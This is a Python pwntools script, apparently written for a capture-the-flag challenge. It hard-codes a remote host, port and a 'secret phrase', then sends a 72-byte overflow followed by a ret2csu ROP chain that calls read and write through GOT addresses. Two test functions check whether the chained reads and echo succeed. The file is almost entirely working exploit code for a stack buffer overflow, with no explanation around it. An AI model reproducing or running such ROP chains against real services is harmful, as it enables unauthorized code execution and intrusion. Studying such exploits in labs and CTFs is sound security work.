#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
context.log_level='error'

HOST='154.57.164.77'; PORT=32702
csu_pop=0x401512; csu_call=0x4014f8
got_read=0x403250; got_write=0x403230; got_open=0x403278
bm=0x404200; bp=0x404100

def test_simple_two_reads():
    """Just 2 reads from stdin then write: read(0,bm,32) + read(0,bp,40) + write(1,bp,12)"""
    r=remote(HOST,PORT)
    r.sendlineafter(b'secret phrase:',b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year:')
    pay=b'A'*72
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(bm)+p64(32)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(bp)+p64(40)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(1)+p64(bp)+p64(12)+p64(got_write)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    
    r.send(pay)
    import time; time.sleep(1)
    # Send exactly 32 + 40 bytes
    r.send(b'A'*32 + b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.ljust(40,b'\x00'))
    time.sleep(1)
    try:
        data=r.recv(timeout=5)
        print(f'Got {len(data)} bytes: {data[:200]}')
        if b'BBBB' in data:
            print('Two reads work!')
    except Exception as e: print(f'Error: {e}')
    r.close()

def test_single_big_read():
    """One read of 72 bytes, then write it back: read(0,bp,72) + write(1,bp,72)"""
    r=remote(HOST,PORT)
    r.sendlineafter(b'secret phrase:',b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year:')
    pay=b'A'*72
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(bp)+p64(72)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(1)+p64(bp)+p64(72)+p64(got_write)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    
    r.send(pay)
    import time; time.sleep(1)
    r.send(b'TESTDATA' + b'.'*64)
    time.sleep(1)
    try:
        data=r.recv(timeout=5)
        print(f'Single big read: {data[:200]}')
    except Exception as e: print(f'Error: {e}')
    r.close()

print('=== Single big read ===')
test_single_big_read()
print()
print('=== Two sequential reads from stdin ===')
test_simple_two_reads()
